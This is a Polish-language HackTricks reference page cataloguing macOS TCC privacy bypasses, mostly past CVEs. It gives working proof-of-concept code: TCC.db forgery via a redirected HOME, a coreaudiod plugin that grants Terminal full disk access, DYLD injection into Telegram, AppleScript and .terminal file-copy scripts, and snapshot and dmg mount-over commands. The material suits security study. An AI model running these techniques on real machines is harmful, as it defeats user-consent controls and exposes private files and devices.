# Bypassy TCC w macOS

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Według funkcjonalności

### Bypass zapisu

To nie jest bypass, to po prostu sposób działania TCC: **Nie chroni przed zapisem**. Jeśli Terminal **nie ma dostępu do odczytu pulpitu użytkownika, nadal może w niego zapisywać**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Rozszerzony atrybut `com.apple.macl`** jest dodawany do nowego **pliku**, aby umożliwić aplikacji **twórcy** dostęp do odczytu.

### TCC ClickJacking

Możliwe jest **umieszczenie okna nad monitorem TCC**, aby użytkownik **zaakceptował** go niezauważenie. Możesz znaleźć PoC w [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Żądanie TCC pod dowolną nazwą

Atakujący może **tworzyć aplikacje o dowolnej nazwie** (np. Finder, Google Chrome...) w pliku **`Info.plist`** i sprawić, że będzie ona prosić o dostęp do chronionego obszaru TCC. Użytkownik będzie myślał, że to legitymacyjna aplikacja prosi o ten dostęp.\
Co więcej, możliwe jest **usunięcie legitymacyjnej aplikacji z Docka i umieszczenie fałszywej**, więc gdy użytkownik kliknie na fałszywą (która może używać tego samego ikonu), może ona wywołać legitymacyjną aplikację, poprosić o uprawnienia TCC i uruchomić złośliwe oprogramowanie, sprawiając, że użytkownik uwierzy, że to legitymacyjna aplikacja prosi o dostęp.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Więcej informacji i PoC znajdziesz tutaj:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Bypass

Domyślnie dostęp przez **SSH miał "Pełny dostęp do dysku"**. Aby to wyłączyć, musisz mieć to wymienione, ale wyłączone (usunięcie z listy nie usunie tych uprawnień):

![](<../../../../../.gitbook/assets/image (569).png>)

Tutaj znajdziesz przykłady, jak niektóre **złośliwe oprogramowanie mogły ominąć tę ochronę**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Zauważ, że teraz, aby móc włączyć SSH, potrzebujesz **Pełnego dostępu do dysku**
{% endhint %}

### Obsługa rozszerzeń - CVE-2022-26767

Atrybut **`com.apple.macl`** jest nadawany plikom, aby dać **pewnej aplikacji uprawnienia do odczytu**. Ten atrybut jest ustawiany, gdy użytkownik **przeciąga i upuszcza** plik na aplikację lub gdy użytkownik **podwaja kliknięcie** pliku, aby otworzyć go za pomocą **domyślnej aplikacji**.

Dlatego użytkownik mógłby **zarejestrować złośliwą aplikację**, aby obsługiwała wszystkie rozszerzenia i wywołać usługi uruchamiania, aby **otworzyć** dowolny plik (dzięki czemu złośliwy plik otrzyma dostęp do odczytu).

### iCloud

Uprawnienie **`com.apple.private.icloud-account-access`** pozwala na komunikację z usługą XPC **`com.apple.iCloudHelper`**, która **udostępnia tokeny iCloud**.

**iMovie** i **Garageband** miały to uprawnienie i inne.

Aby uzyskać więcej **informacji** na temat wykorzystania do **uzyskania tokenów iCloud** z tego uprawnienia, sprawdź prezentację: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatyzacja

Aplikacja z uprawnieniem **`kTCCServiceAppleEvents`** będzie mogła **kontrolować inne aplikacje**. Oznacza to, że może być w stanie **nadużyć udzielonych uprawnień innym aplikacjom**.

Aby uzyskać więcej informacji na temat Skryptów Apple, sprawdź:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Na przykład, jeśli aplikacja ma **uprawnienie Automatyzacji nad `iTerm`**, na przykład w tym przykładzie **`Terminal`** ma dostęp do iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Nad iTerm

Terminal, który nie ma FDA, może wywołać iTerm, który ją ma, i użyć go do wykonywania działań:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Nad Finderem

Jeśli aplikacja ma dostęp nad Finderem, może użyć skryptu takiego jak ten:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Według zachowania aplikacji

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Demon **tccd** w przestrzeni użytkownika używa zmiennej środowiskowej **`HOME`** do uzyskania dostępu do bazy danych użytkowników TCC z lokalizacji: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Zgodnie z [tym postem na Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) i ponieważ demon TCC działa za pośrednictwem `launchd` w dziedzinie bieżącego użytkownika, możliwe jest **kontrolowanie wszystkich zmiennych środowiskowych** przekazywanych do niego.\
W związku z tym **atakujący mógłby ustawić zmienną środowiskową `$HOME`** w **`launchctl`** tak, aby wskazywała na **kontrolowany katalog**, **ponownie uruchomić** demona **TCC**, a następnie **bezpośrednio modyfikować bazę danych TCC**, aby nadać sobie **wszystkie dostępne uprawnienia TCC** bez konieczności pytania użytkownika końcowego.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notatki

Notatki miały dostęp do chronionych lokalizacji TCC, ale gdy notatka jest tworzona, jest to **tworzone w lokalizacji niechronionej**. Dlatego można było poprosić o skopiowanie chronionego pliku do notatki (czyli do lokalizacji niechronionej) i następnie uzyskać dostęp do pliku:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokacja

Binarny plik `/usr/libexec/lsd` z biblioteką `libsecurity_translocate` miał uprawnienie `com.apple.private.nullfs_allow`, które pozwalało na utworzenie montowania **nullfs** oraz uprawnienie `com.apple.private.tcc.allow` z **`kTCCServiceSystemPolicyAllFiles`** do dostępu do każdego pliku.

Było możliwe dodanie atrybutu kwarantanny do "Library", wywołanie usługi XPC **`com.apple.security.translocation`** i wtedy mapowano Library do **`$TMPDIR/AppTranslocation/d/d/Library`**, gdzie można było **uzyskać dostęp** do wszystkich dokumentów w Library.

### CVE-2023-38571 - Muzyka & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Muzyka`** ma ciekawą funkcję: Kiedy jest uruchomiona, **importuje** pliki upuszczone do **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** do "biblioteki multimedialnej" użytkownika. Ponadto, wywołuje coś w stylu: **`rename(a, b);`** gdzie `a` i `b` to:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

To zachowanie **`rename(a, b);`** jest podatne na **Race Condition**, ponieważ można umieścić w folderze `Automatically Add to Music.localized` fałszywy plik **TCC.db**, a następnie, gdy zostanie utworzony nowy folder(b), skopiować plik, usunąć go i skierować go do **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Jeśli **`SQLITE_SQLLOG_DIR="ścieżka/folder"`**, oznacza to w zasadzie, że **każda otwarta baza danych jest kopiowana do tej ścieżki**. W tej CVE to sterowanie zostało nadużyte do **zapisania** wewnątrz bazy danych SQLite, która ma być **otwarta przez proces z bazą danych TCC**, a następnie nadużyć **`SQLITE_SQLLOG_DIR`** z **symlinkiem w nazwie pliku**, więc gdy ta baza danych jest **otwarta**, baza danych użytkownika **TCC.db jest nadpisywana** otwartą bazą danych.\
**Więcej informacji** [**w opisie**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **i**[ **w prezentacji**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Jeśli zmienna środowiskowa **`SQLITE_AUTO_TRACE`** jest ustawiona, biblioteka **`libsqlite3.dylib`** zacznie **logować** wszystkie zapytania SQL. Wiele aplikacji używało tej biblioteki, więc było możliwe zalogowanie wszystkich ich zapytań SQLite.

Kilka aplikacji Apple używało tej biblioteki do uzyskiwania dostępu do chronionych informacji TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Ta **zmienna środowiskowa jest używana przez framework `Metal`**, który jest zależnością różnych programów, w tym głównie `Music`, który ma FDA.

Ustawienie następującego: `MTL_DUMP_PIPELINES_TO_JSON_FILE="ścieżka/nazwa"`. Jeśli `ścieżka` jest poprawnym katalogiem, błąd zostanie wywołany, a możemy użyć `fs_usage`, aby zobaczyć, co dzieje się w programie:

* zostanie otwarty plik o nazwie `path/.dat.nosyncXXXX.XXXXXX` (X to losowa wartość)
* jedno lub więcej operacji `write()` zapisze zawartość do pliku (nie mamy nad tym kontroli)
* `path/.dat.nosyncXXXX.XXXXXX` zostanie zmienione nazwę na `path/nazwa`

Jest to tymczasowe zapisywanie pliku, a następnie **`rename(stary, nowy)`** **co nie jest bezpieczne.**

Nie jest to bezpieczne, ponieważ musi **rozwiązać osobno stare i nowe ścieżki**, co może zająć trochę czasu i być podatne na wyścig. Aby uzyskać więcej informacji, można sprawdzić funkcję `xnu` `renameat_internal()`.

{% hint style="danger" %}
Więc, w skrócie, jeśli uprzywilejowany proces zmienia nazwę z folderu, który kontrolujesz, możesz zdobyć RCE i sprawić, że uzyska dostęp do innego pliku lub, jak w tym CVE, otworzyć plik utworzony przez uprzywilejowaną aplikację i przechować FD.

Jeśli zmiana nazwy dotyczy folderu, który kontrolujesz, podczas gdy zmodyfikowałeś plik źródłowy lub masz FD do niego, zmieniasz plik (lub folder) docelowy, aby wskazywał na symlink, dzięki czemu możesz pisać kiedy chcesz.
{% endhint %}

To był atak w CVE: Na przykład, aby nadpisać bazę danych użytkownika `TCC.db`, możemy:

* utwórz `/Users/hacker/ourlink`, aby wskazywał na `/Users/hacker/Library/Application Support/com.apple.TCC/`
* utwórz katalog `/Users/hacker/tmp/`
* ustaw `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* wywołaj błąd, uruchamiając `Music` z tą zmienną środowiskową
* złap `open()` `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X to losowa wartość)
* tutaj również `open()` ten plik do zapisu i zachowaj deskryptor pliku
* zamień atomowo `/Users/hacker/tmp` na `/Users/hacker/ourlink` **w pętli**
* robimy to, aby zwiększyć szanse na sukces, ponieważ okno wyścigu jest dość wąskie, ale przegrana w wyścigu ma znikome konsekwencje
* poczekaj chwilę
* sprawdź, czy mamy szczęście
* jeśli nie, uruchom ponownie od początku

Więcej informacji na stronie [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Teraz, jeśli spróbujesz użyć zmiennej środowiskowej `MTL_DUMP_PIPELINES_TO_JSON_FILE`, aplikacje nie uruchomią się
{% endhint %}

### Apple Remote Desktop

Jako root możesz włączyć tę usługę, a **agent ARD będzie miał pełny dostęp do dysku**, co użytkownik może wykorzystać do skopiowania nowej **bazy danych użytkownika TCC**.

## Przez **NFSHomeDirectory**

TCC używa bazy danych w folderze HOME użytkownika do kontrolowania dostępu do zasobów specyficznych dla użytkownika w **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Dlatego jeśli użytkownikowi uda się zrestartować TCC z zmienną środowiskową $HOME wskazującą na **inny folder**, użytkownik mógłby utworzyć nową bazę danych TCC w **/Library/Application Support/com.apple.TCC/TCC.db** i oszukać TCC, aby przyznał dowolne uprawnienia TCC dowolnej aplikacji.

{% hint style="success" %}
Należy zauważyć, że Apple używa ustawienia przechowywanego w profilu użytkownika w atrybucie **`NFSHomeDirectory`** jako **wartość `$HOME`**, więc jeśli skompromitujesz aplikację z uprawnieniami do modyfikowania tej wartości (**`kTCCServiceSystemPolicySysAdminFiles`**), możesz **uzbroić** tę opcję w celu ominięcia TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Pierwszy POC** używa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) do modyfikacji folderu **HOME** użytkownika.

1. Uzyskaj blok _csreq_ dla docelowej aplikacji.
2. Wsadź fałszywy plik _TCC.db_ z wymaganym dostępem i blokiem _csreq_.
3. Wyeksportuj wpis usług katalogowych użytkownika za pomocą [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Zmodyfikuj wpis usług katalogowych, aby zmienić katalog domowy użytkownika.
5. Zaimportuj zmodyfikowany wpis usług katalogowych za pomocą [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zatrzymaj _tccd_ użytkownika i zrestartuj proces.

**Drugi POC** użył **`/usr/libexec/configd`**, który miał `com.apple.private.tcc.allow` z wartością `kTCCServiceSystemPolicySysAdminFiles`.\
Było możliwe uruchomienie **`configd`** z opcją **`-t`**, co pozwalało atakującemu określić **niestandardowy pakiet do załadowania**. Dlatego eksploit **zastąpił** metodę zmiany katalogu domowego użytkownika za pomocą **wstrzyknięcia kodu `configd`**.

Aby uzyskać więcej informacji, sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Przez wstrzykiwanie procesów

Istnieją różne techniki wstrzykiwania kodu do procesu i nadużywania jego uprawnień TCC:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Co więcej, najczęstszym sposobem wstrzykiwania procesu do ominięcia TCC jest poprzez **wtyczki (ładowanie bibliotek)**.\
Wtyczki to dodatkowy kod zazwyczaj w formie bibliotek lub plist, który będzie **ładowany przez główną aplikację** i będzie wykonywany w jej kontekście. Dlatego jeśli główna aplikacja miała dostęp do plików objętych restrykcjami TCC (poprzez udzielone uprawnienia lub entitlements), **niestandardowy kod również je będzie miał**.

### CVE-2020-27937 - Directory Utility

Aplikacja `/System/Library/CoreServices/Applications/Directory Utility.app` miała entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, ładowała wtyczki z rozszerzeniem **`.daplug`** i **nie miała zabezpieczonej** wersji uruchomieniowej.

Aby uzbroić to CVE, **`NFSHomeDirectory`** jest **zmieniany** (nadużywając poprzedniego entitlementu), aby móc **przejąć bazę danych TCC użytkowników** w celu ominięcia TCC.

Aby uzyskać więcej informacji, sprawdź [**oryginalny raport**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
### CVE-2020-29621 - Coreaudiod

Binarny **`/usr/sbin/coreaudiod`** miał uprawnienia `com.apple.security.cs.disable-library-validation` oraz `com.apple.private.tcc.manager`. Pierwsze **pozwalające na wstrzykiwanie kodu**, a drugie dające dostęp do **zarządzania TCC**.

Ten binarny pozwalał na ładowanie **wtyczek firm trzecich** z folderu `/Library/Audio/Plug-Ins/HAL`. Dlatego było możliwe **załadowanie wtyczki i nadużycie uprawnień TCC** za pomocą tego PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Dla dalszych informacji sprawdź [**oryginalny raport**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Wtyczki warstwy abstrakcji urządzenia (DAL)

Aplikacje systemowe, które otwierają strumień kamery za pośrednictwem Core Media I/O (aplikacje z **`kTCCServiceCamera`**) wczytują **w procesie te wtyczki** znajdujące się w `/Library/CoreMediaIO/Plug-Ins/DAL` (nieobjęte SIP).

Wystarczy przechowywać tam bibliotekę z **konstruktorem** ogólnym, aby móc **wstrzyknąć kod**.

Kilka aplikacji Apple było podatnych na to.

### Firefox

Aplikacja Firefox miała uprawnienia `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Dla więcej informacji na temat łatwego wykorzystania tego [**sprawdź oryginalny raport**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binarny plik `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` miał uprawnienia **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, co pozwalało na wstrzyknięcie kodu do procesu i użycie uprawnień TCC.

### CVE-2023-26818 - Telegram

Telegram miał uprawnienia **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, więc było możliwe nadużycie ich do **uzyskania dostępu do swoich uprawnień**, takich jak nagrywanie z kamery. Możesz [**znaleźć ładunek w opisie**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Zauważ, jak użyć zmiennej środowiskowej do załadowania biblioteki, został utworzony **niestandardowy plist** do wstrzyknięcia tej biblioteki, a **`launchctl`** został użyty do jej uruchomienia:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Poprzez otwieranie wywołań

Możliwe jest wywołanie **`open`** nawet podczas działania w piaskownicy.

### Skrypty terminala

Jest dość powszechne, aby nadać terminalowi **Pełny dostęp do dysku (FDA)**, przynajmniej na komputerach używanych przez osoby techniczne. I możliwe jest wywołanie skryptów **`.terminal`** z jego użyciem.

Skrypty **`.terminal`** to pliki plist, takie jak ten z poleceniem do wykonania w kluczu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacja mogłaby zapisać skrypt terminala w lokalizacji takiej jak /tmp i uruchomić go za pomocą komendy:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Poprzez montowanie

### CVE-2020-9771 - mount\_apfs - bypass TCC i eskalacja uprawnień

**Dowolny użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować migawkę Time Machine i uzyskać dostęp do **WSZYSTKICH plików** z tej migawki.\
Jedynym wymaganym uprawnieniem jest, aby aplikacja używana (np. `Terminal`) miała dostęp **Pełnego Dostępu do Dysku** (FDA) (`kTCCServiceSystemPolicyAllfiles`), który musi zostać udzielony przez administratora.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Bardziej szczegółowe wyjaśnienie można [**znaleźć w oryginalnym raporcie**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montowanie nad plikiem TCC

Nawet jeśli plik bazy danych TCC jest chroniony, było możliwe **zamontowanie nad katalogiem** nowego pliku TCC.db:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Sprawdź **pełne wykorzystanie** w [**oryginalnym opisie**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Narzędzie **`/usr/sbin/asr`** pozwalało skopiować cały dysk i zamontować go w innym miejscu omijając zabezpieczenia TCC.

### Usługi lokalizacyjne

Istnieje trzecia baza danych TCC w **`/var/db/locationd/clients.plist`** wskazująca klientów uprawnionych do **dostępu do usług lokalizacyjnych**.\
Folder **`/var/db/locationd/` nie był chroniony przed montowaniem DMG**, więc było możliwe zamontowanie własnego pliku plist.

## Przez aplikacje startowe

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Przez grep

W kilku przypadkach pliki przechowywały wrażliwe informacje, takie jak emaile, numery telefonów, wiadomości... w niechronionych lokalizacjach (co stanowiło lukę w zabezpieczeniach Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Kliknięcia syntetyczne

To już nie działa, ale [**działało w przeszłości**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Inny sposób korzystając z [**zdarzeń CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Odnośniki

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Sposobów na Ominięcie Mechanizmów Prywatności macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Wygrana z TCC - 20+ NOWYCH Sposobów na Ominięcie Mechanizmów Prywatności w MacOS**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
